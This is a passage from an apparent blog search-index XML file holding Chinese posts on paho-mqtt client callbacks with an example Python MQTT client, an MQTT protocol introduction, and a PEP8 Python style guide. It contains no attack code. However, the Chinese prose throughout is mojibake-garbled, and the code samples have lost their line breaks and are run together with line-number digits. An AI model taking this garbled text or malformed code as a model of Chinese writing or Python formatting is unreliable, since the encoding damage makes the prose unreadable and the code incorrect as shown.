è¯¥æ¶ˆæ¯çš„è´¨é‡: 0, 1, 2 retain: è¯¥æ¶ˆæ¯æ˜¯å¦æ˜¯ä¿ç•™æ¶ˆæ¯, å¦‚æœä¸ºTrue è¿™ä¸ºä¿ç•™æ¶ˆæ¯, å¦‚æœä¸ºFalseå°±æ˜¯æœ€æ–°çš„æ¶ˆæ¯ã€‚ mid: message id on_publish(client, userdata, mid)å½“ä½¿ç”¨publishæ–¹æ³•å°†messageä¼ è¾“åˆ°brokeråè°ƒç”¨, ä½†æ˜¯è¿™è¦é’ˆå¯¹ä¸åŒçš„qos, å¯¹äºqos1å’Œ2è€Œè¨€, è¿™è¡¨ç¤ºæ¶ˆæ¯å·²ç»åˆ°è¾¾åçš„å›è°ƒ, å¦‚æœqosæ˜¯0é‚£ä¹ˆä»…ä»…è¡¨ç¤ºæ¶ˆæ¯ç¦»å¼€äº†å®¢æˆ·ç«¯ä¹‹åçš„å›è°ƒã€‚è¿™ä¸ªå›è°ƒå¾ˆé‡è¦ï¼Œå› ä¸ºå³ä½¿publish()è°ƒç”¨è¿”å›æˆåŠŸï¼Œå¹¶ä¸æ€»æ˜¯æ„å‘³ç€å·²ç»å‘é€äº†æ¶ˆæ¯ mid: è¡¨ç¤ºå·²ç»publishå‡ºå»çš„æ¶ˆæ¯çš„message id on_subscribe(client, userdata, mid, granted_qos)å½“brokerå“åº”äº†subscribeè¯·æ±‚ä¹‹åè°ƒç”¨ã€‚ mid: è¢«è®¢é˜…æ¶ˆæ¯çš„message id granted_qos: brokerä¸ºä¸åŒçš„è®¢é˜…è¯·æ±‚æˆæƒçš„qosçº§åˆ«ã€‚æ˜¯ä¸€ä¸ªåˆ—è¡¨ã€‚ on_unsubscribe(client, userdata, mid)å½“brokerå“åº”äº†å–æ¶ˆè®¢é˜…çš„è¯·æ±‚è¿‡åè°ƒç”¨ã€‚ mid: å–æ¶ˆè®¢é˜…çš„æ¶ˆæ¯çš„message id on_log(client, userdata, level, buf)MQTTé€šä¿¡è¿‡ç¨‹ä¸­çš„ä¸€äº›Debugä¿¡æ¯ level: æ—¥å¿—çº§åˆ«MQTT_LOG_INFO, MQTT_LOG_NOTICE, MQTT_LOG_WARNING, MQTT_LOG_ERR, and MQTT_LOG_DEBUG buf: message buffer, debugä¿¡æ¯æœ¬èº«ã€‚ ç¤ºä¾‹ä»£ç æˆ‘Githubä¸Šæœ‰: å®Œæ•´ç¤ºä¾‹ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#!/usr/bin/env python3# -*- coding: utf8 -*-import threadingimport loggingimport timefrom paho.mqtt.client import ClientFORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'logging.basicConfig(format=FORMAT, level=logging.INFO)logger = logging.getLogger()def pub_topic_test01(client): while True: client.publish(topic="test01", qos=2, payload="test01 topic data") time.sleep(2)def pub_topic_test02(client): while True: client.publish(topic="test02", qos=2, payload="test02 topic data") time.sleep(2)class MyMQTTClass(Client): """ mqtt client for deal data """ def __init__(self): super(MyMQTTClass, self).__init__(client_id="test client", clean_session=False) def on_connect(self, client, obj, flags, rc): logger.info("on connect, rc: %s" % rc) # é“¾æ¥è¿‡åå…ˆå¤„ç†sub client.subscribe(topic="test01", qos=2) client.subscribe(topic="test02", qos=2) logger.info("start topic service1...") t1 = threading.Thread(target=pub_topic_test01, args=(client,)) t1.start() self.worker1 = t1 logger.info("start topic service2...") t2 = threading.Thread(target=pub_topic_test02, args=(client,)) t2.start() self.worker2 = t2 def on_message(self, client, obj, msg): logger.debug("on message, topic: %s, qos: %s, data: %s" % (msg.topic, msg.qos, msg.payload)) if msg.topic == "test01": logger.info("deal test01, data: %s" % msg.payload) elif msg.topic == "test02": logger.info("deal test02, data: %s" % msg.payload) else: logger.info("other topic %s, data: %s" %(msg.topic, msg.payload)) def on_publish(self, client, obj, mid): logger.debug("publish -&gt; ,mid: %s" % mid) def on_subscribe(self, client, obj, mid, granted_qos): logger.debug("subscribed &lt;- ,mid: %s, qos: %s" %(mid, granted_qos)) def on_log(self, mqttc, obj, level, string): logger.debug("mqtt debug: %s" % string) def on_disconnect(self, client, userdata, rc): logger.info("disconnect: %s" % rc) while rc == 1: try: client.reconnect() logger.info("reconnect success") rc = 0 except Exception as e: logger.error("reconnect error, %s retry after 3s" % e) time.sleep(3) def run(self): self.connect("172.16.112.251", 1883, 60) while True: rc = self.loop() if rc != 0: time.sleep(1) rc = self.loop() logger.info("recovery from error loop, %s" % rc)def main(): client = MyMQTTClass() client.run()if __name__ == "__main__": main()]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>mqtt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç‰©è”ç½‘ä¹‹MQTT]]></title>
    <url>%2F2017%2F07%2F02%2Fmqtt-introduce%2F</url>
    <content type="text"><![CDATA[ç‰©è”ç½‘ç‰©æ¥å…¥åè®®MQTT ç›¸å¯¹æ¥è¯´ï¼ŒIoTçš„æŠ€æœ¯æŒ‘æˆ˜ï¼Œä¸»è¦åœ¨å®‰å…¨éšæ‚£ã€è¿æ¥ç®¡ç†ã€æµ·é‡æ•°æ®ç®¡ç†ï¼Œç”¨å…³é”®å­—æ¥è¯´å°±æ˜¯æµ·é‡ã€é€šç”¨ã€å¯æ‰©å±•ã€ç®€å•ã€‚ç‰©æ¥å…¥äº‘ç«¯ï¼Œæœ‰å¾ˆå¤šæŒ‘æˆ˜, æ•°æ®çš„å®‰å…¨å°¤ä¸ºé‡è¦ åè®®æ¯”è¾ƒåè®®æ¯”è¾ƒ MQTTç®€ä»‹MQTTæ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯æœåŠ¡ç«¯æ¶æ„çš„å‘å¸ƒ/è®¢é˜…æ¨¡å¼çš„æ¶ˆæ¯ä¼ è¾“åè®®ã€‚å®ƒçš„è®¾è®¡æ€æƒ³æ˜¯è½»å·§ã€å¼€æ”¾ã€ç®€å•ã€è§„èŒƒï¼Œæ˜“äºå®ç°ã€‚è¿™äº›ç‰¹ç‚¹ä½¿å¾—å®ƒå¯¹å¾ˆå¤šåœºæ™¯æ¥è¯´éƒ½æ˜¯å¾ˆå¥½çš„é€‰æ‹©ï¼Œç‰¹åˆ«æ˜¯å¯¹äºå—é™çš„ç¯å¢ƒå¦‚æœºå™¨ä¸æœºå™¨çš„é€šä¿¡(M2M)ä»¥åŠç‰©è”ç½‘ç¯å¢ƒ(IoT)ã€‚æ€»ä½“æ¥è¯´MQTTæœ‰å¦‚ä¸‹ç‰¹æ€§: è½»é‡çº§çš„ machine-to-machine é€šä¿¡åè®®ã€‚ publish/subscribeæ¨¡å¼ã€‚ åŸºäºTCP/IPã€‚ æ”¯æŒQoSã€‚ é€‚åˆäºä½å¸¦å®½ã€ä¸å¯é è¿æ¥ã€åµŒå…¥å¼è®¾å¤‡ã€CPUå†…å­˜èµ„æºç´§å¼ ã€‚ æ˜¯ä¸€ç§æ¯”è¾ƒä¸é”™çš„Androidæ¶ˆæ¯æ¨é€æ–¹æ¡ˆã€‚ FacebookMessengeré‡‡ç”¨äº†MQTTã€‚ MQTTæœ‰å¯èƒ½æˆä¸ºç‰©è”ç½‘çš„é‡è¦åè®® mqttåè®®ç®€ä»‹ åè®®ç®€ä»‹ æŠ¥æ–‡æ ¼å¼bit76543210byte 1Message typeDUPQoS levelRETAINbyte 2Message length (between one and four bytes)byte 3â€¦ if needed to encode message lengthbyte 4â€¦ if needed to encode message lengthbyte 5â€¦ if needed to encode message length æ§åˆ¶æŒ‡ä»¤ Message Type Value Description CONNECT 1 Client request to connect to Server CONNACK 2 Connect Acknowledgment PUBLISH 3 Publish message PUBACK 4 Publish Acknowledgment PUBREC 5 Publish Received (assured delivery part 1) PUBREL 6 Publish Release (assured delivery part 2) PUBCOMP 7 Publish Complete (assured delivery part 3) SUBSCRIBE 8 Client Subscribe request SUBACK 9 Subscribe Acknowledgment UNSUBSCRIBE 10 Client Unsubscribe request UNSUBACK 11 Unsubscribe Acknowledgment PINGREQ 12 PING Request PINGRESP 13 PING Response DISCONNECT 14 Client is Disconnecting Qos mqttçš„çŠ¶æ€æœºwo]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>iot</tag>
        <tag>mqtt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonç¼–ç é£æ ¼]]></title>
    <url>%2F2017%2F06%2F24%2Fpython-style-pep8%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘åšé¡¹ç›®ä¸€ç›´ä½¿ç”¨Golang, è·ç¦»ä¸Šæ¬¡ä½¿ç”¨Pythonå·²ç»åŠå¹´ä¹‹ä¹…äº†, å¯¹äºGoæ¥è¯´æœ‰fmtå¸®å¿™æ ¼å¼åŒ–, è§£å†³äº†ç»å¤§éƒ¨åˆ†ç¼–ç é£æ ¼é—®é¢˜, è€ŒPythonåˆ™éœ€è¦è‡ªå·±æ³¨æ„,æ ¹æ®å®˜æ–¹æŒ‡å¯¼PEP8æˆ–è€…ä¸€äº›æœ€ä½³å®è·µæ¯”å¦‚Google Styleæ¥æ§åˆ¶é£æ ¼ã€‚æ—¶é—´ä¹…äº† ä¸€äº›ç»†èŠ‚éƒ¨åˆ†å°±å¿˜è®°äº†, äºæ˜¯ç¿»é˜…ä¹‹å‰å†™çš„åšå®¢, å—ç›Šè‰¯å¤š, äºæ˜¯æ‰“ç®—æŠŠä¹‹å‰çš„è¿™å‡ ç¯‡åšå®¢è¿ç§»è¿‡æ¥, é¡ºä¾¿æ›´æ–°, æ–¹ä¾¿ä»¥åæŸ¥é˜…ã€‚ å…³äºæœ¬æ–‡æœ¬æ–‡ä¸»è¦å‚è€ƒPEP8(Pythonç‰ˆæœ¬æ ‡å‡†åº“çš„ç¼–ç çº¦å®š),ä»¥åŠGoogle Styleç¼–ç é£æ ¼, ä½†å´ä¸ä¼šå®Œå…¨æŒ‰ç…§PEP8è¿›è¡Œç¿»è¯‘, æˆ‘ä¸ä¼šè´´å‡ºä¸åˆè§„èŒƒçš„ä»£ç , å°½é‡ç®€æ´æ˜“æ‡‚, æ–¹ä¾¿å¿«é€Ÿé˜…è¯», å¦‚æœæƒ³çœ‹å®Œæ•´ç‰ˆæœ¬çš„PEP8ç›¸å…³æ–‡æ¡£, è¯·ç§»æ­¥å‚è€ƒæ–‡æ¡£éƒ¨åˆ†ã€‚ é£æ ¼æŒ‡å—çš„ç›®çš„é£æ ¼æŒ‡å—çš„ç›®çš„åœ¨äºç»Ÿä¸€ç¼–ç é£æ ¼,è®©ä»£ç æœ‰è§„å¯å¾ª,è¿™æ ·äººä»¬å°±å¯ä»¥ä¸“æ³¨äºâ€ä½ åœ¨è¯´ä»€ä¹ˆâ€, è€Œä¸æ˜¯â€ä½ åœ¨æ€ä¹ˆè¯´â€.ä»è€Œæ”¹å–„Pythonä»£ç çš„å¯è¯»æ€§,å³PEP 20æ‰€è¯´çš„â€œå¯è¯»æ€§è®¡æ•°â€(Readability counts). é£æ ¼æŒ‡é’ˆåœ¨äºç»Ÿä¸€é£æ ¼, PEP8ä»…ä»…æ˜¯å®˜æ–¹æŒ‡å¯¼, æœ¬åœ°ç¼–ç é£æ ¼åŒæ ·é‡è¦, å¦‚æœæ»¡è¶³å¯è¯»æ€§, ä¼˜å…ˆä¿æŒæœ¬åœ°é£æ ¼, ä½¿å¾—ä½ æ•´ä½“é¡¹ç›®çš„ä»£ç é£æ ¼ä¸€è‡´ã€‚ ä»£ç å¸ƒå±€ æ¯çº§ç¼©è¿›ç”¨4ä¸ªç©ºæ ¼(å¼ºçƒˆå»ºè®®ä½¿ç”¨4ä¸ªç©ºæ ¼ä½œä¸ºç¼©è¿›), ä¸è¦æ··ç”¨ç©ºæ ¼å’ŒTab, Python3ä¸­ä¸å…è®¸æ··åˆä½¿ç”¨Tabå’Œç©ºæ ¼ç¼©è¿› 123def get_version(version=None): "Returns a PEP 386-compliant version number from VERSION." version = get_complete_version(version) æ‹¬å·ä¸­ä½¿ç”¨å‚ç›´éšå¼ç¼©è¿›æˆ–ä½¿ç”¨æ‚¬æŒ‚ç¼©è¿›ï¼ˆå¯¹å‡†å·¦æ‹¬å·ï¼‰ 12foo = long_function_name(var_one, var_two, var_three, var_four) ifè¯­å¥è·¨è¡Œæ—¶ï¼Œä¸¤ä¸ªå­—ç¬¦å…³é”®å­—(æ¯”å¦‚if)åŠ ä¸Šä¸€ä¸ªç©ºæ ¼ï¼Œå†åŠ ä¸Šå·¦æ‹¬å·æ„æˆäº†å¾ˆå¥½çš„ç¼©è¿›ã€‚ 1234# Add some extra indentation on the conditional continuation line.if (this_is_one_thing and that_is_another_thing): do_something() å³è¾¹æ‹¬å·ä¹Ÿå¯ä»¥å¦èµ·ä¸€è¡Œï¼ˆå³æ‹¬å·å›é€€ï¼‰ 12345678my_list = [ 1, 2, 3, 4, 5, 6,]result = some_function_that_takes_arguments( 'a', 'b', 'c', 'd', 'e', 'f',) æœ€å¤§è¡Œå®½é™åˆ¶æ‰€æœ‰è¡Œçš„æœ€å¤§è¡Œå®½ä¸º79å­—ç¬¦ã€‚æ–‡æœ¬é•¿å—ï¼Œæ¯”å¦‚æ–‡æ¡£å­—ç¬¦ä¸²æˆ–æ³¨é‡Šï¼Œè¡Œé•¿åº¦åº”é™åˆ¶ä¸º72ä¸ªå­—ç¬¦ã€‚ç»­è¡Œçš„é¦–é€‰æ–¹æ³•æ˜¯ä½¿ç”¨å°æ‹¬å·ã€ä¸­æ‹¬å·å’Œå¤§æ‹¬å·åæ–œçº¿ä»å¯èƒ½åœ¨é€‚å½“çš„æ—¶å€™ã€‚å…¶æ¬¡æ˜¯åæ–œæ ã€‚123with open('/path/to/some/file/you/want/to/read') as file_1, \ open('/path/to/some/file/being/written', 'w') as file_2: file_2.write(file_1.read()) ç©ºè¡Œ ç©ºäºŒè¡Œ: é¡¶çº§å®šä¹‰ä¹‹é—´ç©ºä¸¤è¡Œ, æ¯”å¦‚å‡½æ•°æˆ–è€…ç±»å®šä¹‰. ç©ºä¸€è¡Œ: æ–¹æ³•å®šä¹‰, ç±»å®šä¹‰ä¸ç¬¬ä¸€ä¸ªæ–¹æ³•ä¹‹é—´, éƒ½åº”è¯¥ç©ºä¸€è¡Œ. å‡½æ•°æˆ–æ–¹æ³•ä¸­, æŸäº›åœ°æ–¹è¦æ˜¯ä½ è§‰å¾—åˆé€‚, å°±ç©ºä¸€è¡Œ.12345678910111213141516171819202122232425class StreamingHttpResponse(HttpResponseBase): """ A streaming HTTP response class with an iterator as content. This should only be iterated once, when the response is streamed to the client. However, it can be appended to or replaced with a new iterator that wraps the original content (or yields entirely new content). """ streaming = True def __init__(self, streaming_content=(), *args, **kwargs): super(StreamingHttpResponse, self).__init__(*args, **kwargs) # `streaming_content` should be an iterable of bytestrings. # See the `streaming_content` property methods. self.streaming_content = streaming_content @property def content(self): raise AttributeError("This %s instance has no `content` attribute. " "Use `streaming_content` instead." % self.__class__.__name__) @property def streaming_content(self): return map(self.make_bytes, self._iterator) æ¨¡å—å¯¼å…¥ å¯¼å…¥åœ¨å•ç‹¬æˆè¡Œ, åŒä¸€ä¸ªæ¨¡å—çš„å¤šä¸ªå¯¹è±¡è¢«å¯¼å‡ºæ—¶ä½¿ç”¨() å¯¼å…¥å§‹ç»ˆåœ¨æ–‡ä»¶çš„é¡¶éƒ¨ï¼Œåœ¨æ¨¡å—æ³¨é‡Šå’Œæ–‡æ¡£å­—ç¬¦ä¸²ä¹‹åï¼Œåœ¨æ¨¡å—å…¨å±€å˜é‡å’Œå¸¸é‡ä¹‹å‰ã€‚ æ¨èç»å¯¹è·¯å¾„å¯¼å…¥ï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸æ›´å¯è¯»ï¼Œè€Œä¸”å¾€å¾€æ˜¯è¡¨ç°æ›´å¥½çš„ï¼ˆæˆ–è‡³å°‘æä¾›æ›´å¥½çš„é”™è¯¯æ¶ˆæ¯ã€‚ ç¦æ­¢ä½¿ç”¨é€šé…ç¬¦å¯¼å…¥ã€‚ å¯¼å…¥é¡ºåºå¦‚ä¸‹ï¼šæ ‡å‡†åº“è¿›å£,ç›¸å…³çš„ç¬¬ä¸‰æ–¹åº“ï¼Œæœ¬åœ°åº“ã€‚å„ç»„çš„å¯¼å…¥ä¹‹é—´è¦æœ‰ç©ºè¡Œã€‚123456789101112131415161718192021222324252627282930313233# æ ‡å‡†åº“import asyncioimport osimport tracebackfrom functools import partialfrom inspect import isawaitablefrom multiprocessing import Processfrom signal import ( SIGTERM, SIGINT, signal as signal_func, Signals)from socket import ( socket, SOL_SOCKET, SO_REUSEADDR,)from time import time# ç¬¬ä¸‰æ–¹åº“from httptools import HttpRequestParserfrom httptools.parser.errors import HttpParserErrortry: import uvloop as async_loopexcept ImportError: async_loop = asyncio# æœ¬åœ°åº“from sanic.log import log, netlogfrom sanic.response import HTTPResponsefrom sanic.request import Requestfrom sanic.exceptions import ( RequestTimeout, PayloadTooLarge, InvalidUsage, ServerError) å­—ç¬¦ä¸²å¼•ç”¨Pythonä¸­å•å¼•å·å­—ç¬¦ä¸²å’ŒåŒå¼•å·å­—ç¬¦ä¸²éƒ½æ˜¯ç›¸åŒçš„ã€‚æ³¨æ„å°½é‡é¿å…åœ¨å­—ç¬¦ä¸²ä¸­çš„åæ–œæ ä»¥æé«˜å¯è¯»æ€§ã€‚æ¯”å¦‚ä¸€æ®µå­—ç¬¦ä¸²é‡Œé¢æ—¢æœ‰å•å¼•å·ï¼Œåˆæœ‰åŒå¼•å·ï¼Œå°±çš„ä½¿ç”¨ å¤šè¡Œå­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œé¿å…ä½¿ç”¨ \â€ æˆ–\â€™1error = """My Class hasn't "test" attribute.""" è¡¨è¾¾å¼å’Œè¯­å¥ä¸­çš„ç©ºæ ¼12345678910111213141516171819202122# æ‹¬å·é‡Œè¾¹é¿å…ç©ºæ ¼ spam(ham[1], &#123;eggs: 2&#125;)# é€—å·ï¼Œå†’å·ï¼Œåˆ†å·ä¹‹å‰é¿å…ç©ºæ ¼if x == 4: print x, y; x, y = y, x# ç´¢å¼•æ“ä½œç¬¦ä¸ç•™ç©ºæ ¼ham[1:9:3]# å‡½æ•°è°ƒç”¨çš„å·¦æ‹¬å·ä¹‹å‰ä¸èƒ½æœ‰ç©ºæ ¼spam(1)# äºŒå…ƒæ“ä½œç¬¦ä¸¤è¾¹ç•™ä¸€ä¸ªç©ºæ ¼,æ¶‰åŠ =ã€ç¬¦åˆæ“ä½œç¬¦ ( += , -=ç­‰)ã€æ¯”è¾ƒ( == , &lt; , &gt; , != , &lt;&gt; , &lt;= , &gt;= , in , not in , is , is not )ã€å¸ƒå°”( and , or , not )x = 1# æä¼˜å…ˆçº§è¿ç®—ç¬¦å‰åä¸ç•™ç©ºæ ¼hypot2 = x*x + y*yc = (a+b) * (a-b)# å…³é”®å­—å‚æ•°å’Œé»˜è®¤å€¼å‚æ•°çš„å‰åä¸è¦åŠ ç©ºæ ¼def complex(real, imag=0.0): return magic(r=real, i=imag)# å‡½æ•°æ³¨é‡Šä¸­ï¼Œ=å‰åè¦æœ‰ç©ºæ ¼ï¼Œå†’å·å’Œ"-&gt;"çš„å‰é¢æ— ç©ºæ ¼ï¼Œåé¢æœ‰ç©ºæ ¼ã€‚def munge(sep: AnyStr = None):def munge() -&gt; AnyStr:# å°½é‡ä¸ä½¿ç”¨å¤åˆè¯­å¥(Compound statements: å¤šæ¡è¯­å¥å†™åœ¨åŒä¸€è¡Œ)if foo == 'blah': do_blah_thing() æ™®é€šæ³¨é‡Šé€šç”¨è§„åˆ™: ä¸ä»£ç è‡ªç›¸çŸ›ç›¾çš„æ³¨é‡Šæ¯”æ²¡æ³¨é‡Šæ›´å·®ã€‚ä¿®æ”¹ä»£ç æ—¶è¦ä¼˜å…ˆæ›´æ–°æ³¨é‡Šï¼ æ³¨é‡Šæ˜¯å®Œæ•´çš„å¥å­ã€‚å¦‚æœæ³¨é‡Šæ˜¯æ–­å¥ï¼Œé¦–å­—æ¯åº”è¯¥å¤§å†™ï¼Œé™¤éå®ƒæ˜¯å°å†™å­—æ¯å¼€å¤´çš„æ ‡è¯†ç¬¦(æ°¸è¿œä¸è¦ä¿®æ”¹æ ‡è¯†ç¬¦çš„å¤§å°å†™)ã€‚ å¦‚æœæ³¨é‡Šå¾ˆçŸ­ï¼Œå¯ä»¥çœç•¥æœ«å°¾çš„å¥å·ã€‚æ³¨é‡Šå—é€šå¸¸ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ®µè½ç»„æˆã€‚æ®µè½ç”±å®Œæ•´çš„å¥å­æ„æˆä¸”æ¯ä¸ªå¥å­åº”è¯¥ä»¥ç‚¹å·(åé¢è¦æœ‰ä¸¤ä¸ªç©ºæ ¼)ç»“æŸï¼Œå¹¶æ³¨æ„æ–­è¯å’Œç©ºæ ¼ã€‚ éè‹±è¯­å›½å®¶çš„ç¨‹åºå‘˜è¯·ç”¨è‹±è¯­ä¹¦å†™ä½ çš„æ³¨é‡Šï¼Œé™¤éä½ 200%ç¡®ä¿¡ä»£ç æ°¸è¿œä¸ä¼šè¢«ä¸æ‡‚ä½ çš„è¯­è¨€çš„äººé˜…è¯»ã€‚ æ³¨é‡Šå—: æ³¨é‡Šå—é€šå¸¸åº”ç”¨åœ¨ä»£ç å‰ï¼Œå¹¶å’Œè¿™äº›ä»£ç æœ‰åŒæ ·çš„ç¼©è¿›ã€‚æ¯è¡Œä»¥ â€˜# â€˜(é™¤éå®ƒæ˜¯æ³¨é‡Šå†…çš„ç¼©è¿›æ–‡æœ¬ï¼Œæ³¨æ„#åé¢æœ‰ç©ºæ ¼)ã€‚ æ³¨é‡Šå—å†…çš„æ®µè½ç”¨ä»…åŒ…å«å•ä¸ª â€˜#â€™ çš„è¡Œåˆ†å‰²ã€‚ è¡Œå†…æ³¨é‡Š: æ…ç”¨è¡Œå†…æ³¨é‡Š(Inline Comments) èŠ‚ä¿­ä½¿ç”¨è¡Œå†…æ³¨é‡Šã€‚ è¡Œå†…æ³¨é‡Šæ˜¯å’Œè¯­å¥åœ¨åŒä¸€è¡Œï¼Œè‡³å°‘ç”¨ä¸¤ä¸ªç©ºæ ¼å’Œè¯­å¥åˆ†å¼€ã€‚è¡Œå†…æ³¨é‡Šä¸æ˜¯å¿…éœ€çš„ï¼Œé‡å¤ç½—å—¦ä¼šä½¿äººåˆ†å¿ƒã€‚ 123456# We use a weighted dictionary search to find out where i is in# the array. We extrapolate position based on the largest num# in the array and the array size and then do binary search to# get the exact number.if i &amp; (i-1) == 0: # true iff i is a power of 2 æ–‡æ¡£æ³¨é‡Šè¿™éƒ¨åˆ†å¾ˆé‡è¦, ä»–æ˜¯Pythonç‹¬æœ‰çš„, ä¸ºæ‰€æœ‰å…¬å…±æ¨¡å—ã€å‡½æ•°ã€ç±»å’Œæ–¹æ³•ä¹¦å†™æ–‡æ¡£å­—ç¬¦ä¸²ã€‚éå…¬å¼€æ–¹æ³•ä¸ä¸€å®šæœ‰æ–‡æ¡£å­—ç¬¦ä¸²ï¼Œå»ºè®®æœ‰æ³¨é‡Š(å‡ºç°åœ¨defè¡Œä¹‹å)æ¥æè¿°è¿™ä¸ªæ–¹æ³•åšä»€ä¹ˆ, è¯¦æƒ…å‚è€ƒPEP 257 æ–‡æ¡£å­—ç¬¦ä¸²çº¦å®š, ä½†æ˜¯è¿™éƒ¨åˆ†æˆ‘æ¯”è¾ƒæ¨å´‡Google Styleé£æ ¼ã€‚ æ–‡æ¡£å­—ç¬¦ä¸²ä»€ä¹ˆæ˜¯æ–‡æ¡£å­—ç¬¦ä¸²(Document String):æ–‡æ¡£å­—ç¬¦ä¸²æ˜¯åŒ…, æ¨¡å—, ç±»æˆ–å‡½æ•°é‡Œçš„ç¬¬ä¸€ä¸ªè¯­å¥. è¿™äº›å­—ç¬¦ä¸²å¯ä»¥é€šè¿‡å¯¹è±¡çš„__doc__æˆå‘˜è¢«è‡ªåŠ¨æå–, å¹¶ä¸”è¢«pydocæ‰€ç”¨. æ–‡æ¡£å­—ç¬¦ä¸²çš„æ ¼å¼:é¦–å…ˆæ˜¯ä¸€è¡Œä»¥å¥å·, é—®å·æˆ–æƒŠå¹å·ç»“å°¾çš„æ¦‚è¿°(æˆ–è€…è¯¥æ–‡æ¡£å­—ç¬¦ä¸²å•çº¯åªæœ‰ä¸€è¡Œ). æ¥ç€æ˜¯ä¸€ä¸ªç©ºè¡Œ. æ¥ç€æ˜¯æ–‡æ¡£å­—ç¬¦ä¸²å‰©ä¸‹çš„éƒ¨åˆ†,å®ƒåº”è¯¥ä¸æ–‡æ¡£å­—ç¬¦ä¸²çš„ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå¼•å·å¯¹é½. ä¸‹é¢æœ‰æ›´å¤šæ–‡æ¡£å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–è§„èŒƒ. æ¨¡å—æ–‡æ¡£æ¨¡å—è¯´æ˜: å¯¹è¿™ä¸ªæ¨¡å—è¿›è¡Œæ¦‚è²Œæ€§çš„æè¿°, æ¯”å¦‚Jsonåº“çš„è¯´æ˜1234567891011121314151617181920212223242526r"""JSON (JavaScript Object Notation) &lt;http://json.org&gt; is a subset ofJavaScript syntax (ECMA-262 3rd edition) used as a lightweight datainterchange format.:mod:`json` exposes an API familiar to users of the standard library:mod:`marshal` and :mod:`pickle` modules. It is the externally maintainedversion of the :mod:`json` library contained in Python 2.6, but maintainscompatibility with Python 2.4 and Python 2.5 and (currently) hassignificant performance advantages, even without using the optional Cextension for speedups.Compact encoding:: &gt;&gt;&gt; import json &gt;&gt;&gt; json.dumps([1,2,3,&#123;'4': 5, '6': 7&#125;], sort_keys=True, separators=(',',':')) '[1,2,3,&#123;"4":5,"6":7&#125;]'Using json.tool from the shell to validate and pretty-print:: $ echo '&#123;"json":"obj"&#125;' | python -m json.tool &#123; "json": "obj" &#125; $ echo '&#123; 1.2:3.4&#125;' | python -m json.tool Expecting property name enclosed in double quotes: line 1 column 3 (char 2)""" å‡½æ•°å’Œæ–¹æ³•æ–‡æ¡£è¿™é‡Œè¯´çš„å‡½æ•°,åŒ…æ‹¬å‡½æ•°, æ–¹æ³•, ä»¥åŠç”Ÿæˆå™¨ã€‚ ä¸€ä¸ªå‡½æ•°å¿…é¡»è¦æœ‰æ–‡æ¡£å­—ç¬¦ä¸², é™¤éå®ƒæ»¡è¶³ä»¥ä¸‹æ¡ä»¶: å¤–éƒ¨ä¸å¯è§ éå¸¸çŸ­å° ç®€å•æ˜äº† æ–‡æ¡£å­—ç¬¦ä¸²åº”è¯¥æä¾›è¶³å¤Ÿçš„ä¿¡æ¯, å½“åˆ«äººç¼–å†™ä»£ç è°ƒç”¨è¯¥å‡½æ•°æ—¶, ä»–ä¸éœ€è¦çœ‹ä¸€è¡Œä»£ç , åªè¦çœ‹æ–‡æ¡£å­—ç¬¦ä¸²å°±å¯ä»¥äº†.å› æ­¤éœ€è¦æè¿°æ¸…æ¥šä»¥ä¸‹å‡ ç‚¹: å‡½æ•°å‚æ•°: Argsåˆ—å‡ºæ¯ä¸ªå‚æ•°çš„åå­—, å¹¶åœ¨åå­—åä½¿ç”¨ä¸€ä¸ªå†’å·å’Œä¸€ä¸ªç©ºæ ¼, åˆ†éš”å¯¹è¯¥å‚æ•°çš„æè¿°.å¦‚æœæè¿°å¤ªé•¿è¶…è¿‡äº†å•è¡Œ80å­—ç¬¦,ä½¿ç”¨2æˆ–è€…4ä¸ªç©ºæ ¼çš„æ‚¬æŒ‚ç¼©è¿›(ä¸æ–‡ä»¶å…¶ä»–éƒ¨åˆ†ä¿æŒä¸€è‡´). æè¿°åº”è¯¥åŒ…æ‹¬æ‰€éœ€çš„ç±»å‹å’Œå«ä¹‰. å¦‚æœä¸€ä¸ªå‡½æ•°æ¥å—foo(å¯å˜é•¿åº¦å‚æ•°åˆ—è¡¨)æˆ–è€…**bar (ä»»æ„å…³é”®å­—å‚æ•°), åº”è¯¥è¯¦ç»†åˆ—å‡ºfooå’Œ**bar. æ­£å¸¸è¿”å›: Returns/Yieldsæè¿°è¿”å›å€¼çš„ç±»å‹å’Œè¯­ä¹‰. å¦‚æœå‡½æ•°è¿”å›None, è¿™ä¸€éƒ¨åˆ†å¯ä»¥çœç•¥. å¼‚å¸¸è¿”å›: Raises:åˆ—å‡ºä¸æ¥å£æœ‰å…³çš„æ‰€æœ‰å¼‚å¸¸. 123456789101112131415161718192021222324252627282930def fetch_bigtable_rows(big_table, keys, other_silly_variable=None): """Fetches rows from a Bigtable. Retrieves rows pertaining to the given keys from the Table instance represented by big_table. Silly things may happen if other_silly_variable is not None. Args: big_table: An open Bigtable Table instance. keys: A sequence of strings representing the key of each table row to fetch. other_silly_variable: Another optional variable, that has a much longer name than the other args, and which does nothing. Returns: A dict mapping keys to the corresponding table row data fetched. Each row is represented as a tuple of strings. For example: &#123;'Serak': ('Rigel VII', 'Preparer'), 'Zim': ('Irk', 'Invader'), 'Lrrr': ('Omicron Persei 8', 'Emperor')&#125; If a key from the keys argument is missing from the dictionary, then that row was not found in the table. Raises: IOError: An error occurred accessing the bigtable.Table object. """ pass ç±»æ–‡æ¡£åŒç†ç±»ä¹Ÿéœ€è¦åšè¯¦å°½çš„æè¿°: è¯¥ç±»çš„ç›®çš„, ä»¥åŠæ¦‚è²Œæè¿° ç±»æœ‰å…¬å…±å±æ€§(Attributes), éœ€è¦æè¿°å…¶æ„ä¹‰ æ³¨æ„äº‹é¡¹ 